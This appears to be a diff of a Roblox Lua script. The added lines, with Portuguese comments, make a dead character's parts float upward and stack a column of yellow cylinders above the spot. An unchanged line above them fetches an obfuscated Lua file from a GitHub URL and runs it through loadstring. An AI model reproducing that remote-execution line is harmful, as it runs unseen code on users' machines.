@@ -81,4 +81,68 @@ tool.Activated:Connect(function()
 end)
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+-- Script para criar uma fila de cilindros completamente colados até o céu
+local player = game.Players.LocalPlayer
+
+local cylinders = {} -- Lista para armazenar os cilindros
+
+player.CharacterAdded:Connect(function(char)
+    -- Quando o personagem reaparecer, destruir a fila de cilindros antiga
+    for _, cyl in ipairs(cylinders) do
+        if cyl.Parent then
+            cyl:Destroy()
+        end
+    end
+    cylinders = {} -- Limpa a lista de cilindros
+
+    local humanoid = char:WaitForChild("Humanoid")
+    local rootPart = nil
+
+    if char:FindFirstChild("HumanoidRootPart") then
+        rootPart = char.HumanoidRootPart
+    else
+        char.ChildAdded:Connect(function(child)
+            if child.Name == "HumanoidRootPart" then
+                rootPart = child
+            end
+        end)
+    end
+
+    humanoid.Died:Connect(function()
+        task.wait(0.1)
+
+        -- Faz as partes do corpo subirem suavemente
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+                part.AssemblyLinearVelocity = Vector3.new(0, math.random(20, 30), 0)
+            end
+        end
+
+        -- Cria uma fila de cilindros completamente colados
+        if rootPart then
+            local cylinderCount = 200 -- Quantidade de cilindros na fila
+            local cylinderHeight = 50 -- Altura de cada cilindro
+            local startHeight = -100 -- Começar um pouco abaixo do personagem
+
+            for i = 0, cylinderCount - 1 do
+                local cylinder = Instance.new("Part")
+                cylinder.Shape = Enum.PartType.Cylinder
+                cylinder.Size = Vector3.new(20, cylinderHeight, 20) -- Largura 20, Altura ajustável
+                cylinder.Color = Color3.fromRGB(255, 255, 0) -- Amarelo
+                cylinder.Transparency = 0.5 -- Meio transparente
+                cylinder.Anchored = true
+                cylinder.CanCollide = false
+
+                -- Posiciona os cilindros colados, sem distância entre eles
+                cylinder.CFrame = rootPart.CFrame * CFrame.new(0, startHeight + (i * cylinderHeight), 0) * CFrame.Angles(0, 0, math.rad(90))
+                cylinder.Parent = workspace
+
+                -- Armazena o cilindro na lista para destruição futura
+                table.insert(cylinders, cylinder)
+            end
+        end
+    end)
+end)
+
 
